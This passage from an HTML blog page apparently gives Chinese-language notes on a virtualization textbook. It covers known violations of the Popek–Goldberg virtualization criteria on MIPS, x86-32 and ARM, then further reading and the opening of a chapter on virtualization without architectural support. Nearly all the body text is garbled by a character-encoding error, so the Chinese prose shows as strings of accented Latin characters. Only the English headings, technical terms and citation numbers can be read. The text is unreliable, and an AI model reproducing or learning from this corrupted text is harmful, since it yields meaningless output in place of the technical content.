ä¸ºVMMä¹Ÿå¿…é¡»å­˜åœ¨äºå†…å­˜çš„æŸä¸ªä½ç½®ã€‚æ­¤å¤–ï¼Œå°½ç®¡å®¢æˆ·æ“ä½œç³»ç»Ÿä»¥éç‰¹æƒæ–¹å¼è¿è¡Œï¼Œä½†å¿…é¡»ç¡®ä¿å®ƒä¸å—åº”ç”¨ç¨‹åºçš„å½±å“ã€‚åœ¨x86ä½“ç³»ç»“æ„ä¸­ï¼Œè¿™ä¸¤ä¸ªé—®é¢˜å°†åœ¨Â§4.1ä¸­é‡æ–°è®¨è®ºï¼Œåˆ†åˆ«ä½œä¸ºåœ°å€ç©ºé—´å‹ç¼©å’Œç‰¹æƒçº§åˆ«å‹ç¼©çš„æŒ‘æˆ˜ã€‚</p><p>æœ€åï¼ŒVMMå¿…é¡»é€šè¿‡å°†å®¢æˆ·æ“ä½œç³»ç»ŸæŒ‡å®šçš„é¡µè¡¨æ˜ å°„ä¸å®¢æˆ·ç‰©ç†å†…å­˜å’Œä¸»æœºç‰©ç†å†…å­˜ä¹‹é—´çš„æ˜ å°„ç»„åˆæ¥æ„å»ºè™šæ‹Ÿåœ°å€ç©ºé—´ã€‚åœ¨ç†æƒ³åŒ–çš„åˆ†æ®µä½“ç³»ç»“æ„ä¸­ï¼Œè¿™åªæ˜¯ä¸€ä¸ªç®€å•çš„ç»„åˆé—®é¢˜ï¼Œä½†åœ¨åŸºäºé¡µé¢çš„ç³»ç»Ÿä¸­è¦å¤æ‚å¾—å¤šã€‚å®é™…ä¸Šï¼Œè§£å†³è¿™ä¸ªé—®é¢˜æœ‰ä¸¤ç§å¸¸ç”¨çš„æ–¹æ³•ï¼Œåˆ†åˆ«ç§°ä¸ºå½±å­é¡µè¡¨ï¼ˆè§Â§3.2.5ï¼‰å’Œæ‰©å±•é¡µè¡¨ï¼ˆè§Â§5.1ï¼‰ã€‚</p><h2 id="2-5-WELL-KNOWN-VIOLATIONS"><a href="#2-5-WELL-KNOWN-VIOLATIONS" class="headerlink" title="2.5 WELL-KNOWN VIOLATIONS"></a>2.5 WELL-KNOWN VIOLATIONS</h2><p>åœ¨ä»–ä»¬çš„æ–‡ç« ä¸­ï¼ŒPopekå’ŒGoldbergä»¥DEC PDP-10ä¸ºä¾‹ï¼Œè¯´æ˜äº†ä¸€ç§æœªèƒ½æ»¡è¶³è™šæ‹ŸåŒ–è¦æ±‚çš„æ¶æ„ã€‚ç°åœ¨è®©æˆ‘ä»¬åˆ—ä¸¾ä¸€äº›ç°ä»£æ—¶ä»£å·²çŸ¥çš„è¿è§„è¡Œä¸ºã€‚è¿™ä¸ªè¿è§„è¡Œä¸ºçš„åˆ—è¡¨ä¸æ˜¯è¯¦å°½æ— é—çš„ã€‚å¯¹äºè®¨è®ºçš„ä½“ç³»ç»“æ„ï¼Œæˆ‘ä»¬ä¾§é‡äºé‚£äº›åœ¨é™åˆ¶ä¸å…·å¤‡å®Œæ•´æ€§å£°ç§°çš„å¤„ç†å™¨æ¶æ„çš„éƒ¨ç½²æ–¹é¢äº§ç”Ÿå®é™…å½±å“çš„è¿è§„è¡Œä¸ºã€‚æˆ‘ä»¬ç¡®å®è¯†åˆ«äº†ä¸€äº›è¿è§„è¡Œä¸ºçš„æ¨¡å¼ï¼š</p><ul><li>ç›´æ¥è®¿é—®ç‰©ç†å†…å­˜ï¼šæŸäº›ä½“ç³»ç»“æ„å†³ç­–ç›´æ¥å°†ç‰©ç†å†…å­˜æš´éœ²åˆ°è™šæ‹Ÿå†…å­˜çš„ç¡¬ç¼–ç éƒ¨åˆ†ã€‚è¿™åœ¨MIPSä½“ç³»ç»“æ„ä¸­ç‰¹åˆ«æ˜æ˜¾ï¼ˆè§Â§2.5.1ï¼‰ã€‚</li><li>ä½ç½®æ•æ„ŸæŒ‡ä»¤ï¼šå…¶ä»–å†³ç­–é€šè¿‡éç‰¹æƒæŒ‡ä»¤å…¬å¼€äº†æŸäº›æ•æ„Ÿæ•°æ®ç»“æ„åœ¨å†…å­˜ä¸­çš„ä½ç½®ï¼ˆä¾‹å¦‚ï¼Œx86ä¸­çš„å…¨å±€æè¿°ç¬¦è¡¨ï¼Œè§Â§2.5.2ï¼‰ã€‚</li><li>æ§åˆ¶æ•æ„Ÿè¿è§„è¡Œä¸ºï¼šå½“ISAæ˜ç¡®ä¸ºç›¸åŒæŒ‡ä»¤å®šä¹‰äº†ä¸åŒçš„è¯­ä¹‰ï¼Œå–å†³äºç‰¹æƒçº§åˆ«æ—¶ï¼Œå°±ä¼šå‘ç”Ÿè¿™ç§æƒ…å†µï¼ˆä¾‹å¦‚ï¼Œx86ä¸Šçš„iretã€popfï¼Œè§Â§2.5.2ï¼‰ã€‚</li></ul><h3 id="2-5-1-MIPS"><a href="#2-5-1-MIPS" class="headerlink" title="2.5.1 MIPS"></a>2.5.1 MIPS</h3><p>MIPSä½“ç³»ç»“æ„æ˜¯ä¸€ç§ç»å…¸çš„RISCï¼ˆç²¾ç®€æŒ‡ä»¤é›†è®¡ç®—æœºï¼‰ISAã€‚å®ƒæœ‰ä¸‰ç§æ‰§è¡Œæ¨¡å¼ï¼šå†…æ ¸æ¨¡å¼ï¼ˆæœ€é«˜ç‰¹æƒçº§åˆ«ï¼‰ã€ç›‘ç®¡æ¨¡å¼å’Œç”¨æˆ·æ¨¡å¼ï¼ˆæœ€ä½ç‰¹æƒçº§åˆ«ï¼‰ã€‚åªæœ‰å†…æ ¸æ¨¡å¼å¯ä»¥æ‰§è¡Œç‰¹æƒæŒ‡ä»¤ã€‚ç›‘ç®¡æ¨¡å¼å®é™…ä¸Šæ˜¯ç”¨æˆ·æ¨¡å¼çš„ä¸€ç§å¤‡ç”¨å½¢å¼ï¼Œå…¶æ˜æ˜¾å¥½å¤„åœ¨äºå®ƒå¯ä»¥è®¿é—®å¯¹å¸¸è§„ç”¨æˆ·æ¨¡å¼ä¸å¯ç”¨çš„è™šæ‹Ÿå†…å­˜éƒ¨åˆ†ã€‚</p><p>é¦–å…ˆï¼Œå¥½æ¶ˆæ¯æ˜¯ï¼šè¿™æ˜¯ä¸€ä¸ªéå¸¸æœ‰å‰é€”çš„é«˜æ•ˆè™šæ‹Ÿæœºç›‘è§†å™¨è®¾è®¡çš„èµ·ç‚¹ã€‚äº‹å®ä¸Šï¼Œè™šæ‹Ÿæœºç›‘è§†å™¨å°†åœ¨å†…æ ¸æ¨¡å¼ä¸‹è¿è¡Œï¼Œå¹¶ä¸”å¯ä»¥ç®€å•åœ°åœ¨ç›‘ç®¡æ¨¡å¼ä¸‹è¿è¡Œå®¢æˆ·æ“ä½œç³»ç»Ÿï¼Œæ ¹æ®å…¶åŸå§‹è¯­ä¹‰æ¨¡æ‹Ÿæ‰€æœ‰ç‰¹æƒæŒ‡ä»¤ã€‚ç›‘ç®¡æ¨¡å¼çš„å¯ç”¨æ€§å¯¼è‡´äº†ä¸€ä¸ªé‡è¦çš„ä¼˜åŒ–ï¼šç”±äºç›‘ç®¡è™šæ‹Ÿå†…å­˜å—åˆ°åº”ç”¨ç¨‹åºçš„ä¿æŠ¤ï¼Œè™šæ‹Ÿæœºç›‘è§†å™¨å¯ä»¥ç®€å•åœ°å°†å®¢æˆ·æ“ä½œç³»ç»Ÿå’Œåº”ç”¨ç¨‹åºä¹‹é—´çš„è½¬æ¢è§†ä¸ºç›‘ç®¡æ¨¡å¼å’Œç”¨æˆ·æ¨¡å¼ä¹‹é—´çš„è½¬æ¢ã€‚è¿™ç§è½¬æ¢ä¸éœ€è¦æ›´æ”¹è™šæ‹Ÿå†…å­˜çš„é…ç½®ï¼Œä¹Ÿä¸éœ€è¦åˆ·æ–°TLBï¼ˆè½¬è¯‘åå¤‡ç¼“å­˜ï¼‰ã€‚</p><p>åœ¨MIPSä½“ç³»ç»“æ„ä¸­ï¼Œè™šæ‹Ÿå†…å­˜è¢«åˆ’åˆ†ä¸ºå¤šä¸ªå›ºå®šå¤§å°çš„åŒºåŸŸï¼Œæ¯ä¸ªåŒºåŸŸéƒ½å…·æœ‰ç¡¬ç¼–ç çš„å±æ€§ï¼Œç¡®å®šäº†éœ€è¦è®¿é—®è¯¥åŒºåŸŸçš„æ‰§è¡Œæ¨¡å¼ï¼Œå¦‚ä½•é€šè¿‡TLBï¼ˆæ˜ å°„ï¼‰æˆ–é€šè¿‡ç¡¬ç¼–ç çš„æ©ç ï¼ˆæœªæ˜ å°„ï¼‰æ¥é‡æ–°å®šä½åœ°å€ï¼Œä»¥åŠæ˜¯å¦åº”è¯¥é€šè¿‡é«˜é€Ÿç¼“å­˜å±‚æ¬¡ç»“æ„è¿›è¡Œè®¿é—®ã€‚è¡¨2.1æ˜¾ç¤ºäº†32ä½ä½“ç³»ç»“æ„çš„è¿™äº›åŒºåŸŸã€‚64ä½æ‰©å±•åˆ›å»ºäº†å…·æœ‰ç›¸åŒä¸€èˆ¬åŸç†çš„é¢å¤–çš„å›ºå®šå¤§å°åŒºåŸŸã€‚</p><p>ç°åœ¨æ˜¯åæ¶ˆæ¯ï¼šMIPSä½“ç³»ç»“æ„ä¸å…·å¤‡è™šæ‹ŸåŒ–èƒ½åŠ›ï¼Œé¦–è¦åŸå› æ˜¯å®ƒä½¿ç”¨äº†åŒºåŸŸã€‚äº‹å®ä¸Šï¼ŒåŒºåŸŸçš„ä½¿ç”¨æ˜¯ä½ç½®æ•æ„Ÿçš„ï¼ˆä¸€ç§è¡Œä¸ºæ•æ„Ÿï¼‰ï¼Œå› ä¸ºå®ƒæ˜¯å¤„ç†å™¨ç‰¹æƒçº§åˆ«çš„å‡½æ•°ã€‚è¿™å…·æœ‰ä¸¥é‡çš„åæœï¼Œå› ä¸ºä»»ä½•æœŸæœ›åœ¨å†…æ ¸æ¨¡å¼ä¸‹è¿è¡Œçš„æ“ä½œç³»ç»Ÿéƒ½å°†è¢«ç¼–è¯‘ä»¥ä½¿ç”¨KSEG0å’ŒKSEG1æ®µã€‚å¦‚æœè™šæ‹Ÿæœºç›‘è§†å™¨å°è¯•åœ¨ç›‘ç®¡æ¨¡å¼æˆ–ç”¨æˆ·æ¨¡å¼ä¸‹è¿è¡Œè¯¥æ“ä½œç³»ç»Ÿï¼Œæ¯ä¸ªå†…å­˜åŠ è½½/å­˜å‚¨æŒ‡ä»¤éƒ½ä¼šå¯¼è‡´é™·é˜±ï¼Œä»è€Œè¿åäº†è™šæ‹ŸåŒ–çš„æ•ˆç‡æ ‡å‡†ã€‚ç”±äºæ“ä½œç³»ç»Ÿé€šå¸¸ä¸ä¼šç¼–è¯‘æˆ–é“¾æ¥ä¸ºå¯æ‰§è¡Œä½ç½®æ— å…³çš„ä»£ç ï¼Œå› æ­¤è™šæ‹ŸåŒ–MIPSä½“ç³»ç»“æ„è‡³å°‘éœ€è¦é‡æ–°ç¼–è¯‘å®Œæ•´çš„å®¢æˆ·æ“ä½œç³»ç»Ÿå†…æ ¸ã€‚æˆ‘ä»¬åœ¨Â§3.1ä¸­è®¨è®ºäº†Discoï¼Œä¸€æ¬¾åŸºäºMIPSçš„è™šæ‹Ÿæœºç›‘è§†å™¨çš„å®ç°æ‰€éœ€çš„ä½“ç³»ç»“æ„å’Œå¦¥åã€‚</p><h3 id="2-5-2-X86-32"><a href="#2-5-2-X86-32" class="headerlink" title="2.5.2 X86-32"></a>2.5.2 X86-32</h3><p>Intel x86-32ä½“ç³»ç»“æ„æ˜¯ä¸€ä¸ªä»¥å¤æ‚è‘—ç§°çš„CISCä½“ç³»ç»“æ„ï¼Œéƒ¨åˆ†åŸå› æ˜¯å®ƒåŒ…æ‹¬å¯¹å¤šåå¹´çš„å‘åå…¼å®¹æ€§çš„ä¼ ç»Ÿæ”¯æŒã€‚å¤šå¹´æ¥ï¼Œè¯¥ä½“ç³»ç»“æ„å¼•å…¥äº†å››ç§ä¸»è¦æ“ä½œæ¨¡å¼ï¼ˆå®æ¨¡å¼ã€ä¿æŠ¤æ¨¡å¼ã€v8086æ¨¡å¼å’Œç³»ç»Ÿç®¡ç†æ¨¡å¼ï¼‰ï¼Œæ¯ç§æ¨¡å¼ä»¥ä¸åŒçš„æ–¹å¼å¯ç”¨äº†ç¡¬ä»¶çš„åˆ†æ®µæ¨¡å‹ã€åˆ†é¡µæœºåˆ¶ã€å››ä¸ªä¿æŠ¤ç¯ä»¥åŠå®‰å…¨åŠŸèƒ½ï¼ˆå¦‚è°ƒç”¨é—¨ï¼‰ã€‚</p><p>x86-32ä½“ç³»ç»“æ„ä¸å…·å¤‡è™šæ‹ŸåŒ–èƒ½åŠ›ã€‚å®ƒåŒ…å«äº†è™šæ‹ŸåŒ–æ•æ„Ÿä½†éç‰¹æƒçš„æŒ‡ä»¤ï¼Œè¿™è¿åäº†Popekå’ŒGoldbergå¯¹ä¸¥æ ¼è™šæ‹ŸåŒ–çš„æ ‡å‡† [143]ã€‚è¿™æ’é™¤äº†ä¼ ç»Ÿçš„é™·é˜±å’Œæ¨¡æ‹Ÿæ–¹æ³•æ¥è¿›è¡Œè™šæ‹ŸåŒ–ã€‚</p><p>å…·ä½“æ¥è¯´ï¼ŒRobinå’ŒIrvineè¯†åˆ«å‡ºäº†17ä¸ªæ•æ„Ÿä½†éç‰¹æƒçš„é—®é¢˜æŒ‡ä»¤ [151]ã€‚è¡¨2.2å°†è¿™äº›æŒ‡ä»¤åˆ†æˆäº†5ç±»ï¼šæ“ä½œä¸­æ–­æ ‡å¿—çš„æŒ‡ä»¤ã€æ“ä½œæ®µå¯„å­˜å™¨å’Œæ®µæè¿°ç¬¦çš„æŒ‡ä»¤ã€å¯ä»¥æŸ¥çœ‹ç³»ç»Ÿæ•°æ®ç»“æ„ä½ç½®çš„æŒ‡ä»¤ï¼Œä»¥åŠä¸è°ƒç”¨é—¨ç›¸å…³çš„æŒ‡ä»¤ã€‚å…¶å½±å“éå¸¸ä¸¥é‡ï¼Œè€Œä¸”å¹¿æ³›çŸ¥æ™“ã€‚å®é™…ä¸Šï¼Œåœ¨å¼•å…¥VMwareä¹‹å‰ï¼ŒIntel Corporationçš„å·¥ç¨‹å¸ˆä»¬ç¡®ä¿¡ä»–ä»¬çš„å¤„ç†å™¨åœ¨ä»»ä½•å®é™…æ„ä¹‰ä¸Šéƒ½æ— æ³•è™šæ‹ŸåŒ– [74]ã€‚</p><p><img src="https://img.gls.show/img/20230904114544.png"></p><p>x86-32ä½“ç³»ç»“æ„ç¡®å®æä¾›äº†ä¸€ä¸ªç¬¦åˆPopek/Goldbergå®šç†çš„ä¸¥æ ¼å¯è™šæ‹ŸåŒ–çš„æ‰§è¡Œæ¨¡å¼ï¼šv8086æ¨¡å¼ä¸“é—¨è®¾è®¡ç”¨äºè¿è¡Œ16ä½è™šæ‹Ÿæœºï¼Œè¿è¡Œ16ä½çš„Intel 8086 ISAã€‚è¿™ä¸ªæ¨¡å¼å¯¹äºWindows 95/98è‡³å…³é‡è¦ï¼Œå› ä¸ºå®ƒå…è®¸è¿™äº›32ä½æ“ä½œç³»ç»Ÿè¿è¡Œä¼ ç»Ÿçš„MS-DOSç¨‹åºã€‚ä¸å¹¸çš„æ˜¯ï¼Œè¯¥æ¨¡å¼åªèƒ½æ‰§è¡Œ16ä½çš„è™šæ‹Ÿæœºã€‚</p><h3 id="2-5-3-ARM"><a href="#2-5-3-ARM" class="headerlink" title="2.5.3 ARM"></a>2.5.3 ARM</h3><p>ARMæ¶æ„æ˜¯ä¸€ç§RISC ISAã€‚ä»è™šæ‹ŸåŒ–çš„è§’åº¦æ¥çœ‹ï¼ŒARMå¯ä»¥çœ‹ä½œå…·æœ‰ä¸¤ç§ä¸»è¦çš„æ‰§è¡Œæ¨¡å¼ï¼Œä¸€ç§æˆ–å¤šç§ç‰¹æƒæ¨¡å¼å’Œç”¨æˆ·æ¨¡å¼ã€‚åªæœ‰ç‰¹æƒæ¨¡å¼æ‰èƒ½æ‰§è¡Œç‰¹æƒæŒ‡ä»¤ã€‚ä¾‹å¦‚ï¼ŒARMv6å…·æœ‰7ç§å¤„ç†å™¨æ¨¡å¼ï¼Œç”¨æˆ·æ¨¡å¼å’Œ6ç§ç‰¹æƒæ¨¡å¼ï¼Œè€ŒARMv8å®é™…ä¸Šåªæœ‰ç”¨æˆ·æ¨¡å¼å’Œå•ä¸€ç‰¹æƒæ¨¡å¼ï¼Œå°½ç®¡ARMv8çš„æœ¯è¯­å°†å®ƒä»¬ç§°ä¸ºå¼‚å¸¸çº§åˆ«ã€‚æ¯ç§æ¨¡å¼éƒ½æœ‰ä¸€äº›åˆ†ç»„å¯„å­˜å™¨ï¼Œè¿™æ„å‘³ç€ï¼Œä¾‹å¦‚ï¼Œå¯„å­˜å™¨13åœ¨æ¯ç§æ¨¡å¼ä¸‹æŒ‡å‘ä¸åŒçš„ç‰©ç†å¯„å­˜å™¨ã€‚ç‰¹æƒæ¨¡å¼ä¹‹é—´çš„åŒºåˆ«ä»…æ¶‰åŠåˆ†ç»„å¯„å­˜å™¨ï¼Œå¯¹äºæœ¬è®¨è®ºçš„ç›®çš„å¯ä»¥å¿½ç•¥ä¸è®¡ã€‚</p><p>ARMæ¶æ„ä¸å…·å¤‡è™šæ‹ŸåŒ–èƒ½åŠ›ã€‚å®ƒåŒ…å«äº†è™šæ‹ŸåŒ–æ•æ„Ÿä½†éç‰¹æƒçš„æŒ‡ä»¤ï¼Œè¿åäº†Popekå’ŒGoldbergå¯¹ä¸¥æ ¼è™šæ‹ŸåŒ–çš„æ ‡å‡†ã€‚Dallå’ŒNiehè¯†åˆ«å‡ºäº†24ä¸ªæ•æ„Ÿä½†éç‰¹æƒçš„é—®é¢˜æŒ‡ä»¤ã€‚è¿™äº›ç‰¹å®šæŒ‡ä»¤æ˜¯é’ˆå¯¹ARMv6è¯†åˆ«çš„ï¼Œä½†ä¹Ÿå­˜åœ¨äºæ¶æ„çš„å…¶ä»–ç‰ˆæœ¬ä¸­ã€‚ä¾‹å¦‚ï¼ŒARMv7åœ¨è¿™æ–¹é¢ä¸ARMv6éå¸¸ç›¸ä¼¼ã€‚ç”šè‡³åœ¨æœ€æ–°ç‰ˆæœ¬çš„ARMæ¶æ„ARMv8ä¸­ï¼Œä¹Ÿå­˜åœ¨ç±»ä¼¼çš„é—®é¢˜æŒ‡ä»¤ã€‚è¿™äº›æŒ‡ä»¤æ¶‰åŠç”¨æˆ·æ¨¡å¼å¯„å­˜å™¨ã€çŠ¶æ€å¯„å­˜å™¨ä»¥åŠä¾èµ–äºCPUæ¨¡å¼çš„å†…å­˜è®¿é—®ï¼Œå¦‚è¡¨ä¸­æ‰€åˆ—ã€‚</p><p><img src="https://img.gls.show/img/20230904114819.png"></p><p>æœ‰å„ç§åŠ è½½/å­˜å‚¨å¤šä¸ªæŒ‡ä»¤ï¼Œå½“å¤„äºç‰¹æƒæ¨¡å¼æ—¶è®¿é—®ç”¨æˆ·æ¨¡å¼å¯„å­˜å™¨ã€‚ç„¶è€Œï¼Œè¿™äº›æŒ‡ä»¤åœ¨ARMæ¶æ„ä¸­è¢«å®šä¹‰ä¸ºåœ¨ç”¨æˆ·æ¨¡å¼ä¸‹æ‰§è¡Œæ—¶æ˜¯ä¸å¯é¢„æµ‹çš„ï¼Œè¿™æ„å‘³ç€ä¸èƒ½ä¾èµ–æŒ‡ä»¤çš„ç»“æœã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªå¸¸è§çš„ä¸å¯é¢„æµ‹æŒ‡ä»¤çš„å®ç°æ˜¯ï¼Œå¤„ç†å™¨ä¼šå¿½ç•¥å®ƒè€Œä¸ä¼šå¼•å‘é™·é˜±ã€‚</p><p>çŠ¶æ€å¯„å­˜å™¨æŒ‡ä»¤æ¶‰åŠåˆ°ç‰¹æ®Šçš„ARMçŠ¶æ€å¯„å­˜å™¨ï¼Œå³å½“å‰ç¨‹åºçŠ¶æ€å¯„å­˜å™¨ï¼ˆCPSRï¼‰å’Œä¿å­˜ç¨‹åºçŠ¶æ€å¯„å­˜å™¨ï¼ˆSPSRï¼‰ã€‚CPSRæŒ‡å®šäº†CPUçš„å½“å‰æ¨¡å¼å’Œå…¶ä»–çŠ¶æ€ä¿¡æ¯ï¼Œå…¶ä¸­ä¸€äº›æ˜¯ç‰¹æƒçš„ã€‚SPSRæ˜¯åœ¨å¤šç§ç‰¹æƒæ¨¡å¼ä¸‹å¯ç”¨çš„åˆ†ç»„å¯„å­˜å™¨ã€‚åŸºæœ¬çš„ARMä¿æŠ¤æœºåˆ¶é€šè¿‡åœ¨å¤„ç†å™¨é€šè¿‡å¼‚å¸¸è¿›å…¥ç›¸åº”ç‰¹æƒæ¨¡å¼æ—¶å°†CPSRå¤åˆ¶åˆ°SPSRæ¥å·¥ä½œï¼Œä»¥ä¾¿å¯ä»¥ç¡®å®šå¼‚å¸¸å‘ç”Ÿæ—¶çš„CPUçŠ¶æ€ä¿¡æ¯ã€‚ç±»ä¼¼åœ°ï¼ŒSPSRåœ¨å„ç§æ—¶å€™å¤åˆ¶åˆ°CPSRï¼Œä»¥æ›´æ–°CPUçš„æ¨¡å¼ä½œä¸ºé¦–é€‰çš„å¼‚å¸¸è¿”å›æœºåˆ¶ã€‚è¿™äº›æŒ‡ä»¤å­˜åœ¨ä¸‰ç§é—®é¢˜ã€‚é¦–å…ˆï¼ŒMRSå¯ä»¥åœ¨ä»»ä½•æ¨¡å¼ä¸‹ç”¨äºè¯»å–CPSRå¹¶ç¡®å®šCPUæ¨¡å¼ï¼Œå°½ç®¡åœ¨ARMv8ä¸­ä¸å†å¦‚æ­¤ã€‚å…¶æ¬¡ï¼ŒCPSç”¨äºå†™å…¥CPSRå¹¶æ›´æ”¹CPUæ¨¡å¼ï¼Œä½†åœ¨ç”¨æˆ·æ¨¡å¼ä¸‹æ‰§è¡Œæ—¶ä¼šè¢«å¿½ç•¥ã€‚ç¬¬ä¸‰ï¼Œå½“åœ¨ç”¨æˆ·æ¨¡å¼ä¸‹æ‰§è¡Œæ—¶ï¼Œå…¶ä»–çŠ¶æ€å¯„å­˜å™¨æŒ‡ä»¤æ˜¯ä¸å¯é¢„æµ‹çš„ã€‚ä¾‹å¦‚ï¼ŒLDMï¼ˆ3ï¼‰åœ¨ç‰¹æƒæ¨¡å¼ä¸‹æ‰§è¡Œæ—¶å°†SPSRå¤åˆ¶åˆ°CPSRä½œä¸ºæŒ‡ä»¤çš„ä¸€éƒ¨åˆ†ï¼Œä½†åœ¨ç”¨æˆ·æ¨¡å¼ä¸‹æ‰§è¡Œæ—¶æ˜¯ä¸å¯é¢„æµ‹çš„ã€‚</p><p>å‡ ä¹æ‰€æœ‰çš„æ•°æ®å¤„ç†æŒ‡ä»¤éƒ½æœ‰ä¸€ä¸ªç‰¹æ®Šç‰ˆæœ¬ï¼Œé™¤äº†å…¶ALUæ“ä½œå¤–ï¼Œè¿˜å°†CPSRæ›¿æ¢ä¸ºSPSRã€‚è¿™äº›æŒ‡ä»¤ä»¥åœ¨å¼‚å¸¸è¿”å›æ—¶æ›´æ”¹CPUæ¨¡å¼çš„æ–¹å¼è®¾è®¡ï¼Œä¾‹å¦‚ï¼Œå¯ä»¥ä»å†…æ ¸è·³è½¬åˆ°ç”¨æˆ·ç©ºé—´å¹¶åŒæ—¶æ›´æ”¹æ¨¡å¼ã€‚è¿™äº›æŒ‡ä»¤åœ¨ç”¨æˆ·æ¨¡å¼ä¸‹æ‰§è¡Œæ—¶æ˜¯ä¸å¯é¢„æµ‹çš„ã€‚</p><p>å†…å­˜è®¿é—®æŒ‡ä»¤ä½¿ç”¨ä¸åŒäºæ‰§è¡Œæ¨¡å¼çš„CPUæ¨¡å¼æ¥è®¿é—®å†…å­˜ã€‚ARMå¤„ç†å™¨ä¸Šçš„è™šæ‹Ÿå†…å­˜ç³»ç»Ÿä½¿ç”¨è®¿é—®æƒé™æ¥é™åˆ¶æ ¹æ®CPUæ¨¡å¼å¯¹å†…å­˜çš„è®¿é—®ã€‚å°½ç®¡CPUå¤„äºç‰¹æƒæ¨¡å¼ï¼Œæ¶æ„å®šä¹‰äº†å››ä¸ªåä¸ºâ€å¸¦ç¿»è¯‘çš„åŠ è½½/å­˜å‚¨â€çš„æŒ‡ä»¤ï¼Œè¿™äº›æŒ‡ä»¤ä½¿ç”¨ç”¨æˆ·æ¨¡å¼çš„è®¿é—®æƒé™æ¥è®¿é—®å†…å­˜ï¼Œå› æ­¤ä¼šç”±äºå†…å­˜è®¿é—®è¿è§„è€Œè§¦å‘é™·é˜±ã€‚ç„¶è€Œï¼Œå½“åœ¨ç”¨æˆ·æ¨¡å¼ä¸‹æ‰§è¡Œæ—¶ï¼Œè¿™äº›æŒ‡ä»¤çš„è¡Œä¸ºå°±åƒå¸¸è§„çš„å†…å­˜è®¿é—®æŒ‡ä»¤ä¸€æ ·ã€‚ä¾‹å¦‚ï¼Œå½“ä½œä¸ºè™šæ‹Ÿæœºçš„ä¸€éƒ¨åˆ†ä»¥ç”¨æˆ·æ¨¡å¼è¿è¡Œæ“ä½œç³»ç»Ÿå†…æ ¸æ—¶ï¼Œè¿™äº›æŒ‡ä»¤çš„è¯­ä¹‰ä¸åœ¨å†…æ ¸æ¨¡å¼ä¸‹è¿è¡Œæ“ä½œç³»ç»Ÿæ—¶ä¸åŒï¼Œå› æ­¤æ“ä½œç³»ç»Ÿå¯èƒ½çœ‹ä¸åˆ°å®ƒæ‰€æœŸæœ›çš„å†…å­˜è®¿é—®æ•…éšœã€‚</p><h2 id="2-6-FURTHER-READING"><a href="#2-6-FURTHER-READING" class="headerlink" title="2.6 FURTHER READING"></a>2.6 FURTHER READING</h2><p>Popekå’ŒGoldbergçš„è®ºæ–‡ä¸­çš„è¯æ˜æ˜¯é’ˆå¯¹ä¸€ä¸ªç†æƒ³åŒ–çš„å•å¤„ç†å™¨ã€ç¬¬ä¸‰ä»£æ¶æ„ä»¥åŠå•ä¸€è™šæ‹Ÿå†…å­˜æ®µçš„ã€‚å½“ç„¶ï¼Œå½“å‰çš„æ¶æ„è¦å¤æ‚å¾—å¤šï¼šå®ƒä»¬æ”¯æŒå…·æœ‰ç¼“å­˜ä¸€è‡´æ€§å’Œæ˜ç¡®å®šä¹‰çš„ç»†å¾®å†…å­˜ä¸€è‡´æ€§æ¨¡å‹çš„å¤šå¤„ç†å™¨æ¶æ„ã€‚å®ƒä»¬æ”¯æŒé€šè¿‡åˆ†é¡µçš„è™šæ‹Ÿå†…å­˜ï¼Œå¯ä»¥ä½œä¸ºåˆ†æ®µçš„æ›¿ä»£æˆ–è¡¥å……ã€‚æ›´ç³Ÿç³•çš„æ˜¯ï¼Œç»†èŠ‚ä¸­åŒ…å«é—®é¢˜ï¼Œç‰¹åˆ«æ˜¯åœ¨å…·æœ‰ä¼—å¤šä¼ ç»Ÿæ‰§è¡Œæ¨¡å¼å’ŒæŒ‡ä»¤çš„CISCæ¶æ„ä¸Šã€‚</p><p>å°½ç®¡å­˜åœ¨è¿™äº›æ³¨æ„äº‹é¡¹ï¼Œä½†æ„å»ºæ€§çš„è¯æ˜æä¾›äº†ä¸€ç§æ¨ç†è™šæ‹ŸåŒ–çš„æ¡†æ¶ã€‚æ§åˆ¶æ•æ„Ÿå’Œè¡Œä¸ºæ•æ„ŸæŒ‡ä»¤çš„åˆ†ç±»å¯¹è¯„ä¼°ä»»ä½•ç°ä»£è®¡ç®—æœºæ¶æ„éƒ½æ˜¯æœ‰ç”¨çš„æŒ‡å—ã€‚é¼“åŠ±æœ‰å…´è¶£çš„è¯»è€…è¯¦ç»†é˜…è¯»Popekå’ŒGoldbergçš„ç»å…¸è®ºæ–‡ï¼Œä»¥ä¾¿ä»–ä»¬å¯ä»¥æ¨ç†å·²çŸ¥çš„æ¶æ„[143]ã€‚</p><p>x86-32çš„é™åˆ¶å·²ç»è¢«Robinå’ŒIrvineè®°å½•ä¸‹æ¥[151]ï¼Œç„¶è€Œï¼Œè¯¥è®ºæ–‡é”™è¯¯åœ°å¾—å‡ºç»“è®ºï¼Œå› æ­¤æ— æ³•æ„å»ºå®é™…ä¸”å®‰å…¨çš„è™šæ‹ŸåŒ–è§£å†³æ–¹æ¡ˆã€‚ç¬¬4ç« æè¿°äº†Intelåæ¥å¦‚ä½•ä¾èµ–Popekå’ŒGoldbergçš„å®šç†ä½œä¸ºæ¡†æ¶ï¼Œåœ¨x86-64å¤„ç†å™¨ä¸­æ·»åŠ äº†è™šæ‹ŸåŒ–æ”¯æŒ[171]ã€‚</p><p>ARMv6å’Œæ—©æœŸçš„ARMæ¶æ„çš„é™åˆ¶å·²ç»è¢«Dallå’ŒNiehè®°å½•ä¸‹æ¥[59]ã€‚ç¬¬7ç« æè¿°äº†ARMåæ¥å¦‚ä½•åœ¨ARMv7å¤„ç†å™¨ä¸­æ·»åŠ äº†è™šæ‹ŸåŒ–æ”¯æŒ[39]ï¼Œä»¥åŠè¯¥æ¶æ„å¦‚ä½•ä¸Popekå’ŒGoldbergçš„å®šç†ç›¸å…³ã€‚</p><h1 id="3-Virtualization-without-Architectural-Support"><a href="#3-Virtualization-without-Architectural-Support" class="headerlink" title="3 Virtualization without  Architectural Support"></a>3 Virtualization without  Architectural Support</h1><p>è¿™ä¸€ç« ä¸»è¦æ˜¯å…³äºè¿‡å»çš„å†…å®¹ã€‚é‚£äº›åªå…³å¿ƒäº†è§£è™šæ‹ŸåŒ–åœ¨å½“ä»£ç¡¬ä»¶å’Œè™šæ‹Ÿæœºç›‘è§†å™¨ä¸Šè¿è¡Œæ–¹å¼çš„ä»ä¸šè€…å¯èƒ½ä¼šå€¾å‘äºè·³è½¬åˆ°ç¬¬å››ç« 